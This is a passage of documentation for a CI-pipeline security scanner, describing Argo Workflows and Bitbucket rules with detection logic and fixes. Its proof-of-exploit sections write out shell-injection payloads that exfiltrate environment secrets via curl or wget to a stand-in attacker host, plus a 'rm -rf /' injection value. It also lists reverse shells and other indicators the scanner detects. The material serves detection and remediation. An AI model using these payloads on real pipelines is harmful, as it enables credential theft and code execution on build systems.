**Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every template container / script. A privileged container shares the node's kernel namespaces; a malicious image then has root on the build node and breaks the boundary between workflow and cluster.

**Source:** [`ARGO-002`](../providers/argo.md#argo-002) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-003`: Argo workflow uses the default ServiceAccount <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-003 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Applies to ``Workflow`` and ``CronWorkflow``. ``WorkflowTemplate`` / ``ClusterWorkflowTemplate`` are exempt because the SA is set on the run that references them. An explicit ``serviceAccountName: default`` is treated the same as omission.

**Recommendation.** Set ``spec.serviceAccountName`` (or ``spec.workflowSpec.serviceAccountName`` for CronWorkflow) to a least-privilege ServiceAccount that carries only the secrets and RBAC the workflow needs. Falling back to the namespace's ``default`` SA grants access to whatever cluster-admin or wildcard role someone later binds to ``default``, a privilege-escalation surface that should never be load-bearing for workflow pods.

**Source:** [`ARGO-003`](../providers/argo.md#argo-003) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-004`: Argo workflow mounts hostPath or shares host namespaces <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-argo-004 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Walks ``spec.volumes[].hostPath`` and the raw ``spec.podSpecPatch`` string for ``hostNetwork``, ``hostPID``, ``hostIPC``, and ``hostPath``.

**Recommendation.** Use ``emptyDir`` or PVC-backed volumes instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` from any inline ``podSpecPatch``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the workflow break out of the pod and act as the underlying node.

**Source:** [`ARGO-004`](../providers/argo.md#argo-004) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-005`: Argo input parameter interpolated unsafely in script / args <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-argo-005 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Fires on any ``{{inputs.parameters.X}}``, ``{{workflow.parameters.X}}``, or ``{{item.X}}`` token inside a ``script.source`` body or a ``container.args`` string that isn't already wrapped in quotes. Doesn't fire on the env-var indirection pattern, which is safe.

**Recommendation.** Don't interpolate ``{{inputs.parameters.<name>}}`` directly into ``script.source`` or ``container.args``. Argo substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Pass the parameter via ``env:`` (``value: '{{inputs.parameters.<name>}}'``) and reference the env var quoted in the script (``"$NAME"``); or use ``inputs.artifacts`` for file payloads.

**Known false positives.**

- Parameters whose values are always controlled by trusted templates (a fixed enum, an internal SHA, an upstream service identifier the workflow generates itself) are safe to interpolate unquoted but the rule has no way to see the producer. Suppress per-template with ``--ignore-file`` once you've verified the parameter source can't reach a user. Quoted forms (``"{{inputs.parameters.X}}"``) are already excluded by the negative-lookbehind, so the typical safe pattern doesn't false-positive.

**Proof of exploit.**

# Vulnerable: webhook-triggered workflow interpolates a
# user-supplied parameter directly into a shell script.
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata: { generateName: greet- }
spec:
  entrypoint: main
  arguments:
    parameters:
      - name: who
  templates:
    - name: main
      inputs: { parameters: [ { name: who } ] }
      script:
        image: alpine:3.20
        command: [sh]
        source: |
          echo Hello {{inputs.parameters.who}}

# Attack: a webhook caller (or anyone with Submit on the
# WorkflowTemplate) supplies a parameter carrying shell:
#
#   argo submit greet.yml -p who='x;wget -qO- attacker/exfil \
#     -d "$(env|base64)";:'
#
# Argo substitutes the parameter BEFORE handing the source
# to ``sh``, so the `;` ends the echo and the next command
# runs. The pod inherits the workflow's ServiceAccount; if
# that SA has any cluster privilege (mount, image-pull, kubectl)
# the attacker now has it.

# Safe: route through env so the shell only sees a quoted
# expansion of a controlled-name variable.
      script:
        image: alpine:3.20
        command: [sh]
        env:
          - name: WHO
            value: '{{inputs.parameters.who}}'
        source: |
          echo "Hello $WHO"

**Source:** [`ARGO-005`](../providers/argo.md#argo-005) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-006`: Literal secret value in Argo template env or parameter default <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-006 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Strong matches: AWS access keys, GitHub PATs, JWTs. Weak match: env var name suggests a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) and the value is a non-empty literal rather than an interpolation.

**Recommendation.** Mount secrets via ``env.valueFrom.secretKeyRef`` (or a ``volumes:`` Secret mount) instead of writing the value into ``env.value`` or ``arguments.parameters[].value``. Workflow manifests are committed to git and cluster-readable; literal values leak through normal access paths.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ARGO-006`](../providers/argo.md#argo-006) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-008`: Argo script source pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-008 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection), [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Walks ``script.source`` and joined ``container.args`` text with the cross-provider ``CURL_PIPE_RE`` and ``TLS_BYPASS_RE`` regexes.

**Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the template image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the workflow runs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ARGO-008`](../providers/argo.md#argo-008) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-009 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Detection mirrors GHA-006 / TKN-009 / BK-009, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in each Argo document. Fires only on artifact-producing Workflows / WorkflowTemplates (those that invoke ``docker build`` / ``docker push`` / kaniko / ``helm upgrade`` / ``aws s3 sync`` / etc.) so lint-only Workflows don't trip it.

**Recommendation.** Add a cosign step to the Workflow. The most common shape is a final ``sign`` template that runs ``cosign sign --yes <repo>@sha256:<digest>`` after the build. Sign by digest, not tag, so a re-pushed tag can't bypass the signature.

**Source:** [`ARGO-009`](../providers/argo.md#argo-009) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-010 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog: syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool. Fires only on artifact-producing Workflows.

**Recommendation.** Add an SBOM-generation template. ``syft <artifact> -o cyclonedx-json > /tmp/sbom.json`` runs in any standard container; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Persist the SBOM as an output artifact so downstream templates and consumers can read it.

**Source:** [`ARGO-010`](../providers/argo.md#argo-010) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-011 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials, [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``witness run``, ``attest-build-provenance``).

**Recommendation.** Add a ``cosign attest --predicate slsa.json --type slsaprovenance <ref>`` step after the build template, or use ``witness run`` to record the build environment. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`ARGO-011`](../providers/argo.md#argo-011) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-012 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers *does this artifact ship a known CVE?* rather than *can we verify what it is?*. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, osv-scanner, govulncheck, anchore, codeql-action, semgrep, bandit, checkov, tfsec. Walks every Argo document and passes if any document includes a scanner reference.

**Recommendation.** Add a vulnerability scanner template. ``trivy fs /workdir`` for source / filesystem; ``trivy image <ref>`` for container images. ``grype``, ``snyk``, ``npm audit``, ``pip-audit`` are alternatives. Fail the template on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`ARGO-012`](../providers/argo.md#argo-012) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-014`: Argo template script runs unpinned package install <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-014 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. Same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Buildkite / Tekton / Drone. Argo was a gap; this closes it.

Walks ``script.source`` plus joined ``container.args`` / ``container.command`` text per template. Steps and tasks across DAG / steps templates are equally in scope because they all reduce to a container with a shell payload.

**Recommendation.** Pin every package install to a lockfile or a checksum-verified version. ``npm ci`` (not ``npm install``), ``yarn install --frozen-lockfile``, ``pip install -r requirements.txt --require-hashes``, ``bundle install --frozen``. Don't use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (ARGO-008 covers the TLS subset; this rule covers the lockfile subset).

**Known false positives.**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific template name.

**Source:** [`ARGO-014`](../providers/argo.md#argo-014) in the [Argo Workflows provider](../providers/argo.md).

#### `BB-001`: pipe: action not pinned to exact version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Bitbucket pipes are docker-image references. Major-only (`:1`) or missing tags let Atlassian/the publisher swap the image contents. Full semver or sha256 digest is required.

**Recommendation.** Pin every `pipe:` to a full semver tag (e.g. `atlassian/aws-s3-deploy:1.4.0`) or to an immutable SHA. Floating majors like `:1` can roll to new code silently.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** $BITBUCKET_BRANCH, $BITBUCKET_TAG, and $BITBUCKET_PR_* are populated from SCM event metadata the attacker controls. Interpolating them unquoted into a shell command lets a crafted branch or tag name can execute inline.

**Recommendation.** Always double-quote interpolations of ref-derived variables (`"$BITBUCKET_BRANCH"`). Avoid passing them to `eval`, `sh -c`, or unquoted command arguments.

**Known false positives.**

- Pipelines that *parse* a ref name rather than execute it (``echo "$BITBUCKET_BRANCH" | cut -d/ -f2``) still interpolate the variable but expose no shell-execution surface for the value. The rule has no AST-level understanding of the surrounding shell context, so a well-quoted use that happens to live near an unrelated ``$(...)`` substitution can read as an offender. Suppress per-step via ``--ignore-file`` if the value is only consumed as data.

**Proof of exploit.**

# Vulnerable: branch name interpolated unquoted into shell.
image: alpine:latest
pipelines:
  pull-requests:
    '**':
      - step:
          name: triage
          script:
            - echo Building $BITBUCKET_BRANCH
            - ./scripts/build.sh $BITBUCKET_BRANCH

# Attack: open a PR from a branch whose name is shell:
#
#   git checkout -b 'foo;curl https://attacker/x \
#     -d "$(env|base64)";:'
#
# Bitbucket substitutes ``$BITBUCKET_BRANCH`` literally before
# the shell parses the line, so the `;` becomes a command
# separator and the curl exfils the step's env (which holds
# every repository / workspace variable in scope, including
# deploy keys configured for the pipeline).

# Safe: double-quote and pass via env so the value is only
# consumed as data.
      - step:
          name: triage
          script:
            - echo "Building $BRANCH"
            - ./scripts/build.sh "$BRANCH"
          # Bitbucket has no declarative env block; assign
          # via shell so the value is captured as a single
          # argv element from the controlled assignment.
          # (Equivalent: BRANCH="$BITBUCKET_BRANCH"; ...)

**Source:** [`BB-002`](../providers/bitbucket.md#bb-002) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-003 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Scans `definitions.variables` and each step's `variables:` for entries whose KEY looks credential-shaped and whose VALUE is a literal string. AWS access keys are detected by value shape regardless of key name.

**Recommendation.** Store credentials as Repository / Deployment Variables in Bitbucket's Pipelines settings with the 'Secured' flag, and reference them by name. Prefer short-lived OIDC tokens for cloud access.

**Source:** [`BB-003`](../providers/bitbucket.md#bb-003) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-004`: Deploy step missing `deployment:` environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-004 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** A step whose name or invoked pipe matches `deploy` / `release` / `publish` / `promote` should declare a `deployment:` field so Bitbucket enforces deployment-scoped variables, approvals, and history.

**Recommendation.** Add `deployment: production` (or `staging` / `test`) to the step. Configure the matching environment in the repo's Deployments settings with required reviewers and secured variables.

**Source:** [`BB-004`](../providers/bitbucket.md#bb-004) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-006 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Unsigned artifacts can't be verified downstream. Passes when cosign / sigstore / slsa-* / notation-sign appears in the pipeline body.

**Recommendation.** Add a step that runs `cosign sign` against the built image or archive, using Bitbucket OIDC for keyless signing where possible. Publish the signature next to the artifact and verify it at deploy time.

**Source:** [`BB-006`](../providers/bitbucket.md#bb-006) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-007 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / sbom-tool / Trivy-SBOM appears.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM as a build artifact.

**Source:** [`BB-007`](../providers/bitbucket.md#bb-007) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-008 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Complements BB-003 (variable-name scan). BB-008 checks every string in the pipeline against the cross-provider credential-pattern catalog, catches secrets pasted into script bodies or environment blocks.

**Recommendation.** Rotate the exposed credential. Move the value to a Secured Repository or Deployment Variable and reference it by name.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`BB-008`](../providers/bitbucket.md#bb-008) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-009`: pipe: pinned by version rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-bb-009 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** BB-001 fails floating tags at HIGH; BB-009 is the stricter tier. Even immutable-looking semver tags can be repointed by the registry; sha256 digests are tamper-evident.

**Recommendation.** Resolve each pipe to its digest (`docker buildx imagetools inspect bitbucketpipelines/<name>:<ver>`) and reference it via `@sha256:<digest>`.

**Source:** [`BB-009`](../providers/bitbucket.md#bb-009) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-011`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-011 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values embedded in the pipeline file can't be rotated on a fine-grained schedule. Prefer OIDC or Bitbucket secured variables for cross-cloud access.

**Recommendation.** Use Bitbucket OIDC with `oidc: true` on the AWS pipe, or store credentials as secured Bitbucket variables rather than inline values. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from the pipeline file.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-011`](../providers/bitbucket.md#bb-011) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-012`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-012 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`BB-012`](../providers/bitbucket.md#bb-012) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-014`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-014 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-014`](../providers/bitbucket.md#bb-014) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-015`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-015 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`BB-015`](../providers/bitbucket.md#bb-015) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-017`: Repository token written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-017 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Detects patterns where Bitbucket pipeline tokens are redirected to files or piped through `tee`. Persisted tokens survive the step boundary and can be exfiltrated by later steps, artifacts, or cache entries.

**Recommendation.** Never write BITBUCKET_TOKEN or REPOSITORY_OAUTH_ACCESS_TOKEN to files or artifacts. Use the token inline in the command that needs it and let Bitbucket revoke it after the build.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-017`](../providers/bitbucket.md#bb-017) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-018`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-018 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Bitbucket caches are restored by key. When the key includes a value the attacker controls (branch name, tag, PR ID), a pull-request pipeline can plant a poisoned cache entry that a subsequent default-branch build restores.

**Recommendation.** Build the cache key from values the attacker cannot control. Prefer `hashFiles()` on lockfiles enforced by branch protection. Never include $BITBUCKET_BRANCH or PR-related variables in the cache key.

**Source:** [`BB-018`](../providers/bitbucket.md#bb-018) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-019`: after-script references secrets <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-019 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Bitbucket's `after-script` runs unconditionally after the main `script` block (including on failure). If the `after-script` references secrets or tokens, those values may leak into build logs or artifacts even when the step fails unexpectedly. This check detects secret-like variable references in `after-script` blocks.

**Recommendation.** Move secret-dependent operations into the main `script:` block. `after-script` runs even when the step fails and executes in a separate shell context, credential exposure here is harder to audit and more likely to persist in logs.

**Known false positives.**

- The detector matches any variable whose name contains ``TOKEN`` / ``SECRET`` / ``PASSWORD`` / ``KEY`` (case-insensitive). Names that are descriptive rather than secret (``CACHE_KEY``, ``SORT_KEY``, ``TOKEN_TYPE`` used as a label, ``API_KEY_NAME`` storing the *name* of the key rather than its value) trigger the regex even though they aren't credentials. The rule has no way to tell from the name alone, suppress per-step via ``--ignore-file`` when the referenced value is benign.

**Source:** [`BB-019`](../providers/bitbucket.md#bb-019) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-021 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-021`](../providers/bitbucket.md#bb-021) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-022 }

**Evidences:** [`Dependency-Update-Tool`](#ctrl-dependency-update-tool) Project uses an automated dependency-update tool (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`BB-022`](../providers/bitbucket.md#bb-022) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-023 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-023`](../providers/bitbucket.md#bb-023) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-024 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Bitbucket has no native SLSA builder; self-hosted attestation via ``cosign attest`` or ``witness run`` is the usual path. Pipes like ``atlassian/cosign-attest`` (if published) would also match.

**Recommendation.** Add a step that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or integrate the TestifySec ``witness run`` attestor. Artifact signing alone (BB-006) doesn't satisfy SLSA Build L3.

**Source:** [`BB-024`](../providers/bitbucket.md#bb-024) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-025`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-025 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Specific indicators only (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, credential-dump pipes, audit-erasure commands). Does not replace BB-014 (TLS bypass) or BB-013 (Docker insecure), those are hygiene; this is evidence.

**Recommendation.** Treat as a potential compromise. Identify the PR that added the matching step(s), rotate any credentials referenced from the pipeline's variable groups, and audit recent builds.

**Known false positives.**

